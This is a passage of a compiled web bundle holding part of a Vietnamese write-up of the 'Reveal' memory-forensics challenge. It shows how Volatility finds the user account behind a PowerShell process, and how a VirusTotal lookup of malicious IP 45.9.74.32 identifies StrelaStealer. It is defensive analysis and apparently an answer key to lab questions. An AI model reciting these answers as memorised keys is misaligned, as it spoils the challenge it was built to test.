\u0111\xf3?"}),"\n",(0,c.jsx)(t.table,{children:(0,c.jsx)(t.thead,{children:(0,c.jsxs)(t.tr,{children:[(0,c.jsx)(t.th,{children:"Tr\u1ea3 l\u1eddi"}),(0,c.jsx)(t.th,{children:"Elon"})]})})}),"\n",(0,c.jsxs)(t.ul,{children:["\n",(0,c.jsxs)(t.li,{children:[(0,c.jsx)(t.strong,{children:"T\xecm c\xe1i g\xec:"})," T\xe0i kho\u1ea3n ng\u01b0\u1eddi d\xf9ng."]}),"\n",(0,c.jsxs)(t.li,{children:[(0,c.jsx)(t.strong,{children:"T\xecm \u1edf \u0111\xe2u:"})," The Security Identifiers (SIDs) li\xean k\u1ebft v\u1edbi qu\xe1 tr\xecnh."]}),"\n",(0,c.jsxs)(t.li,{children:[(0,c.jsx)(t.strong,{children:"T\xecm th\u1ebf n\xe0o:"})," r\u1ea5t may l\xe0 Volatility c\u0169ng h\u1ed7 tr\u1ee3 ch\u1ee9c n\u0103ng t\xecm theo SIDs n\xean t\xf4i s\u1ebd s\u1eed d\u1ee5ng n\xf3, v\xe0 v\u1eabn l\u1ecdc th\xf4ng tin theo PID 3692 c\u1ee7a powershell.exe ban \u0111\u1ea7u. Theo k\u1ebft qu\u1ea3 th\xec th\u1ea5y \u0111\u01b0\u1ee3c ng\u01b0\u1eddi d\xf9ng l\xe0 ",(0,c.jsx)(t.strong,{children:"Elon"}),", v\u1edbi SID S-1-5-21-3274565340-3808842250-3617890653-1001, quy\u1ec1n truy c\u1eadp v\xe0o Domain, quy\u1ec1n Administrator v\xe0 th\u1eadm ch\xed l\xe0 quy\u1ec1n h\u1ec7 th\u1ed1ng!?"]}),"\n"]}),"\n",(0,c.jsx)(t.p,{children:(0,c.jsx)(t.code,{children:'vol -f /home/vita/Downloads/192-Reveal.dmp windows.getsids.GetSIDs | grep "3692"'})}),"\n",(0,c.jsx)(t.p,{children:(0,c.jsx)(t.img,{alt:"SIDs",src:i(6409).A+"",width:"962",height:"446"})}),"\n",(0,c.jsx)(t.h3,{id:"-q7-t\xean-c\u1ee7a-malware-family",children:"\ud83d\udd0d Q7: T\xean c\u1ee7a malware family?"}),"\n",(0,c.jsx)(t.table,{children:(0,c.jsx)(t.thead,{children:(0,c.jsxs)(t.tr,{children:[(0,c.jsx)(t.th,{children:"Tr\u1ea3 l\u1eddi"}),(0,c.jsx)(t.th,{children:"StrelaStealer"})]})})}),"\n",(0,c.jsxs)(t.ul,{children:["\n",(0,c.jsxs)(t.li,{children:[(0,c.jsx)(t.strong,{children:"T\xecm c\xe1i g\xec:"})," T\xean c\u1ee7a h\u1ecd malware (h\u1ecd h\xe0ng \u1ea5y nha) li\xean quan \u0111\u1ebfn cu\u1ed9c t\u1ea5n c\xf4ng."]}),"\n",(0,c.jsxs)(t.li,{children:[(0,c.jsx)(t.strong,{children:"T\xecm \u1edf \u0111\xe2u:"})," D\u1eef li\u1ec7u t\u1eeb ",(0,c.jsx)(t.strong,{children:"VirusTotal"})," v\xe0 c\xe1c trang c\xf3 Threat Intelligence reports."]}),"\n",(0,c.jsxs)(t.li,{children:[(0,c.jsx)(t.strong,{children:"T\xecm th\u1ebf n\xe0o:"})," ki\u1ec3m tra \u0111\u1ecba ch\u1ec9 IP \u0111\u1ed9c h\u1ea1i 45.9.74.32 tr\xean VirusTotal."]}),"\n"]})]})}function g(n={}){const{wrapper:t}={...(0,e.R)(),...n.components};return t?(0,c.jsx)(t,{...n,children:(0,c.jsx)(a,{...n})}):a(n)}},8613:(n,t,i)=>{i.d(t,{A:()=>h});const h=i.p+"assets/images/Reveal(2)-51a363302d0019455dd64b213d4a5079.png"},4910:(n,t,i)=>{i.d(t,{A:()=>h});const h=i.p+"assets/images/Reveal(3)-d160dd4f3fb497513f77473d2f9cc93b.png"},1331:(n,t,i)=>{i.d(t,{A:()=>h});const h=i.p+"assets/images/Reveal(4)-cd6b6573c8658cf13b15918464cf06c7.png"},7420:(n,t,i)=>{i.d(t,{A:()=>h});const h=i.p+"assets/images/Reveal(5)-1e5008fe66c90ad081b71d0819a6f800.png"},6409:(n,t,i)=>{i.d(t,{A:()=>h});const h=i.p+"assets/images/Reveal(6)-e8d40c87a590d2dcbce56ab1a44d1b9b.png"},1364:(n,t,i)=>{i.d(t,{A:()=>h});const h=i.p+"assets/images/Reveal-e0f60bc8f31c586f1f02228692f6e86b.png"},8453:(n,t,i)=>{i.d(t,{R:()=>l,x:()=>r});var h=i(6540);const c={},e=h.createContext(c);function l(n){const t=h.useContext(e);return h.useMemo((function(){return"function"==typeof n?n(t):{...t,...n}}),[t,n])}function r(n){let t;return t=n.disableParentContext?"function"==typeof n.components?n.components(c):n.components||c:l(n.components),h.createElement(e.Provider,{value:t},n.children)}}}]);